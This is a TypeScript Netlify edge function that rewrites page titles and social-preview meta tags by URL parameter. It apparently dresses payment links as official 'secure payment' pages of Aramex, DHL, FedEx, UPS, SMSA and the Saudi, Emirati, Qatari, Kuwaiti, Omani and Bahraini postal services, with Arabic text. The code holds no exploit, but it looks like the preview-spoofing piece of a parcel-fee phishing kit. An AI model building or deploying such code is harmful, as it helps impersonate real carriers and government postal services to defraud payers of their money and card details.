import { Context } from "https://edge.netlify.com";

// Company metadata mapping
const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
    image: "/og-bahpost.jpg"
  },
  default: {
    title: "دفع آمن - منصة الدفع الموحدة 💳",
    description: "نظام دفع إلكتروني آمن ومحمي بتشفير SSL - أكمل معاملاتك المالية بكل ثقة وأمان مع حماية كاملة لبياناتك 🔒✅",
    image: "/og-aramex.jpg"
  }
};

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  const pathname = url.pathname;
  
  // Only process HTML requests
  const acceptHeader = request.headers.get("accept") || "";
  if (!acceptHeader.includes("text/html")) {
    return context.next();
  }

  // Get the original response
  const response = await context.next();
  let html = await response.text();

  // Extract company key from URL
  // Patterns: /r/{id}?company=aramex or /pay/{id}?company=dhl
  const companyParam = url.searchParams.get("company");
  let companyKey = companyParam || "default";
  
  // Try to extract from path segments for stored links
  const segments = pathname.split("/").filter(Boolean);
  if (segments.length > 0) {
    // Check if it's a payment/receipt path
    const firstSegment = segments[0];
    if (["r", "pay", "receipt"].includes(firstSegment)) {
      // Use company parameter if available, otherwise use default
      companyKey = companyParam || "default";
    }
  }

  // Get metadata for the company
  const meta = companyMeta[companyKey.toLowerCase()] || companyMeta.default;
  const origin = url.origin;
  const fullImageUrl = `${origin}${meta.image}`;
  const fullUrl = url.href;

  // Update meta tags in HTML
  html = html
    // Update title
    .replace(/<title>.*?<\/title>/, `<title>${meta.title}</title>`)
    // Update description
    .replace(
      /<meta name="description" content=".*?".*?>/,
      `<meta name="description" content="${meta.description}" />`
    )
    // Update OG meta tags
    .replace(
      /<meta property="og:title" content=".*?".*?>/,
      `<meta property="og:title" content="${meta.title}" />`
    )
    .replace(
      /<meta property="og:description" content=".*?".*?>/,
      `<meta property="og:description" content="${meta.description}" />`
    )
    .replace(
      /<meta property="og:image" content=".*?".*?>/,
      `<meta property="og:image" content="${fullImageUrl}" />`
    )
    .replace(
      /<meta property="og:url" content=".*?".*?>/,
      `<meta property="og:url" content="${fullUrl}" />`
    )
    // Update Twitter meta tags
    .replace(
      /<meta name="twitter:title" content=".*?".*?>/,
      `<meta name="twitter:title" content="${meta.title}" />`
    )
    .replace(
      /<meta name="twitter:description" content=".*?".*?>/,
      `<meta name="twitter:description" content="${meta.description}" />`
    )
    .replace(
      /<meta name="twitter:image" content=".*?".*?>/,
      `<meta name="twitter:image" content="${fullImageUrl}" />`
    )
    .replace(
      /<meta name="twitter:image:alt" content=".*?".*?>/,
      `<meta name="twitter:image:alt" content="${meta.title}" />`
    );

  // Add og:url if not exists
  if (!html.includes('property="og:url"')) {
    html = html.replace(
      /<meta property="og:image:type"/,
      `<meta property="og:url" content="${fullUrl}" />\n    <meta property="og:image:type"`
    );
  }

  return new Response(html, {
    headers: {
      ...response.headers,
      "content-type": "text/html; charset=utf-8",
      "cache-control": "public, max-age=0, must-revalidate"
    }
  });
};

export const config = {
  path: "/*",
  excludedPath: ["/assets/*", "/api/*", "/*.js", "/*.css", "/*.png", "/*.jpg", "/*.jpeg", "/*.svg", "/*.ico", "/*.json"]
};
